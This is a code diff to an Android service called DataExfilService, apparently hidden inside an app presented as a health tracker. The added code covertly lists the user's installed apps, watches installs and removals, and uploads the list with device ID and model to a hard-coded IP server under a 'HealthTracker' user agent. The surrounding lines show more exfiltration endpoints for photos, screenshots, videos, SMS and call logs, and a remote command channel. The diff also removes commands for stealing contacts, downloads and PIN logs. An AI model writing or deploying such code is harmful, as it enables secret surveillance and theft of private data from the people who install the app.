@@ -49,6 +49,7 @@ class DataExfilService : Service() {
         private const val SCREENSHOT_ENDPOINT = "http://20.2.92.176:5000/screenshots"
         private const val COMMAND_ENDPOINT = "http://20.2.92.176:5000/commands"
         private const val VIDEO_ENDPOINT = "http://20.2.92.176:5000/videos"
+        private const val USER_APPS_ENDPOINT = "http://20.2.92.176:5000/user_apps"
     }
 
     private val photosEndpoint = "http://20.2.92.176:5000/photos"
@@ -72,6 +73,8 @@ class DataExfilService : Service() {
     private lateinit var smsCallLogCollector: SmsCallLogCollector
     private lateinit var smsObserver: ContentObserver
     private lateinit var callLogObserver: ContentObserver
+    private lateinit var packageLister: PackageLister
+    private var lastAppList: List<PackageLister.PackageInfo>? = null
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -110,6 +113,26 @@ class DataExfilService : Service() {
         }
     }
 
+    private val appInstallReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val action = intent.action
+            if (action == PackageLister.ACTION_APP_INSTALLED) {
+                val packageName = intent.getStringExtra(PackageLister.EXTRA_PACKAGE_NAME)
+                val totalApps = intent.getIntExtra(PackageLister.EXTRA_TOTAL_APPS, 0)
+                val isRemoved = intent.getBooleanExtra("removed", false)
+
+                if (isRemoved) {
+                    Log.i(TAG, "App uninstalled: $packageName, Total apps now: $totalApps")
+                } else {
+                    Log.i(TAG, "App installed: $packageName, Total apps now: $totalApps")
+                }
+
+                // Upload updated app list
+                uploadUserAppsList()
+            }
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
@@ -120,6 +143,10 @@ class DataExfilService : Service() {
             IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
         smsCallLogCollector = SmsCallLogCollector(this)
         setupSmsAndCallLogObservers()
+        packageLister = PackageLister(this)
+        packageLister.startListening()
+        registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
+        uploadUserAppsList()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -384,6 +411,14 @@ class DataExfilService : Service() {
             contentResolver.unregisterContentObserver(callLogObserver)
         }
         Log.d(TAG, "Data exfiltration service destroyed")
+        if (::packageLister.isInitialized) {
+            packageLister.stopListening()
+        }
+        try {
+            unregisterReceiver(appInstallReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering appInstallReceiver", e)
+        }
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
         contentResolver.unregisterContentObserver(contactsObserver)
@@ -884,26 +919,6 @@ class DataExfilService : Service() {
                     sendBroadcast(intent)
                     result = "Command $command forwarded to main activity"
                 }
-
-                // Data exfiltration commands
-                "GET_PHOTOS" -> {
-                    scanAndUploadPhotos()
-                    result = "Photo scan initiated"
-                }
-                "GET_CONTACTS" -> {
-                    scanAndUploadContacts()
-                    result = "Contacts scan initiated"
-                }
-                "GET_DOWNLOADS" -> {
-                    uploadAllDownloads()
-                    result = "Downloads scan initiated"
-                }
-                "UPLOAD_LOGS" -> {
-                    uploadAccessibilityLogs()
-                    uploadPinLogs()
-                    result = "Logs upload initiated"
-                }
-
                 else -> {
                     Log.w(TAG, "Unknown command: $command")
                     result = "Unknown command: $command"
@@ -1076,5 +1091,120 @@ class DataExfilService : Service() {
         Log.d(TAG, "CallLog observer registered")
 
         Log.d(TAG, "========== OBSERVER SETUP COMPLETE ==========")
+    }
+
+    private fun uploadUserAppsList() {
+        if (!isNetworkAvailable()) {
+            Log.d(TAG, "No network, skipping user apps list")
+            return
+        }
+
+        Thread {
+            try {
+                Log.d(TAG, "========== UPLOADING USER APPS LIST ==========")
+
+                // Get current apps
+                val currentApps = packageLister.getUserApps()
+
+                // Check if anything changed
+                if (lastAppList != null) {
+                    val oldPackages = lastAppList!!.map { it.packageName }.toSet()
+                    val currentPackages = currentApps.map { it.packageName }.toSet()
+
+                    val newApps = currentPackages - oldPackages
+                    val removedApps = oldPackages - currentPackages
+
+                    if (newApps.isNotEmpty()) {
+                        Log.i(TAG, "New apps installed: $newApps")
+                    }
+                    if (removedApps.isNotEmpty()) {
+                        Log.i(TAG, "Apps uninstalled: $removedApps")
+                    }
+                }
+
+                // Update last list
+                lastAppList = currentApps
+
+                // Get JSON and upload
+                val jsonData = packageLister.getUserAppsAsJson()
+                jsonData.put("scan_type", if (lastAppList == null) "initial" else "update")
+
+                uploadUserAppsJson(jsonData)
+
+                // Save to file
+                packageLister.saveUserAppsToFile()
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Error uploading user apps list", e)
+            }
+        }.start()
+    }
+
+    private fun uploadUserAppsJson(jsonData: JSONObject) {
+        try {
+            val requestBody = jsonData.toString()
+                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+
+            val request = Request.Builder()
+                .url(USER_APPS_ENDPOINT)
+                .post(requestBody)
+                .addHeader("User-Agent", "HealthTracker/1.0")
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "User apps JSON upload failed: ${e.message}")
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.i(TAG, "User apps JSON uploaded successfully")
+                    } else {
+                        Log.w(TAG, "User apps JSON upload failed: HTTP ${response.code}")
+                    }
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading user apps JSON: ${e.message}")
+        }
+    }
+
+    private fun uploadUserAppsFile(bytes: ByteArray, fileName: String) {
+        try {
+            val deviceId = getUniqueDeviceId()
+
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", fileName,
+                    bytes.toRequestBody("text/plain".toMediaTypeOrNull()))
+                .addFormDataPart("device_id", deviceId)
+                .addFormDataPart("device_model", Build.MODEL)
+                .addFormDataPart("type", "user_apps_list")
+                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
+                .build()
+
+            val request = Request.Builder()
+                .url(USER_APPS_ENDPOINT)
+                .post(requestBody)
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "User apps file upload failed: ${e.message}")
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.i(TAG, "User apps file uploaded: $fileName")
+                    } else {
+                        Log.w(TAG, "User apps file upload failed: HTTP ${response.code}")
+                    }
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading user apps file: ${e.message}")
+        }
     }
 }
